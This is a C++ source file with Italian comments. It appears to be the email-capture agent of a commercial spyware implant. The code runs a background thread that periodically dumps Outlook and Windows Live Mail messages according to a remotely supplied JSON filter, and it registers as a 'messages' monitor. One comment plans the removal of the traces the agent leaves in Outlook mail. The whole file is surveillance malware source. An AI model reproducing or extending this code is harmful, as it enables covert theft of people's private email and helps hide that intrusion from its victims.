#include "HM_MailAgent/MailAgent.h"

#define MAIL_SLEEP_TIME 200000 //millisecondi 

// Globals
BOOL g_bMailForceExit = FALSE;		// Semaforo per l'uscita del thread (e da tutti i clicli nelle funzioni chiamate)
BOOL bPM_MailCapStarted = FALSE;	// Indica se l'agente e' attivo o meno
HANDLE hMailCapThread = NULL;		// Thread di cattura
mail_filter_struct g_mail_filter;	// Filtri di cattura usati dal thread


BOOL IsNewerDate(FILETIME *date, FILETIME *dead_line)
{
	// Controlla prima la parte alta
	if (date->dwHighDateTime > dead_line->dwHighDateTime)
		return TRUE;

	if (date->dwHighDateTime < dead_line->dwHighDateTime)
		return FALSE;

	// Se arriva qui vuol dire che la parte alta e' uguale
	// allora controlla la parte bassa
	if (date->dwLowDateTime > dead_line->dwLowDateTime)
		return TRUE;

	return FALSE;
}


DWORD WINAPI CaptureMailThread(DWORD dummy)
{
	LOOP {
		// Chiama tutte le funzioni per dumpare le mail
		OL_DumpEmails(&g_mail_filter);
		WLM_DumpEmails(&g_mail_filter);

		// Sleepa 
		for (int i=0; i<MAIL_SLEEP_TIME; i+=300) {
			CANCELLATION_POINT(g_bMailForceExit);
			Sleep(300);
		}
	}
}


DWORD __stdcall PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
{	
	DWORD dummy;

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_MailCapStarted == bStartFlag)
		return 0;

	bPM_MailCapStarted = bStartFlag;

	if (bStartFlag) {
		// Crea il thread che cattura le mail
		hMailCapThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CaptureMailThread, NULL, 0, &dummy);
	} else {
		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
		// stoppata (bPM_SnapShotStarted = bStartFlag = FALSE)
		QUERY_CANCELLATION(hMailCapThread, g_bMailForceExit);
	}

	return 1;
}


DWORD __stdcall PM_MailCapInit(JSONObject elem)
{
	JSONObject mail, filter;
	FILETIME ftime;

	mail = elem[L"mail"]->AsObject();
	filter = mail[L"filter"]->AsObject();
	g_mail_filter.max_size = (DWORD) filter[L"maxsize"]->AsNumber();
	g_mail_filter.search_string[0] = L'*';
	g_mail_filter.search_string[1] = 0;
	
	HM_TimeStringToFileTime(filter[L"datefrom"]->AsString().c_str(), &g_mail_filter.min_date);
	HM_TimeStringToFileTime(filter[L"dateto"]->AsString().c_str(), &g_mail_filter.max_date);	

	return 1;
}

DWORD __stdcall PM_MailCapUnregister()
{
	// XXX Posso eliminare le tracce che lascia l'agente mail (es: le properties
	// nelle mail di outlook). In questo caso posso esportare una funzione da 
	// OLMAPI.cpp che cicli tutte le mail (esattamente come quando le legge, ma
	// senza alcuna restrizione in data, size, etc) e che faccia DeleteProps di 
	// quelle aggiunte da me (lo faccio con due chiamate separate). 
	// XXX L'unico problema e' che per farlo devo comunque inizializzare le mapi
	// quando viene eseguita questa funzione di unregister (anche se 
	// l'agente non e' mai stato startato), perche' potrebbe aver cambiato le
	// properties in una sessione precedente.
	return 1;
}

void PM_MailCapRegister()
{
	AM_MonitorRegister(L"messages", PM_MAILAGENT, NULL, (BYTE *)PM_MailCapStartStop, (BYTE *)PM_MailCapInit, (BYTE *)PM_MailCapUnregister);
}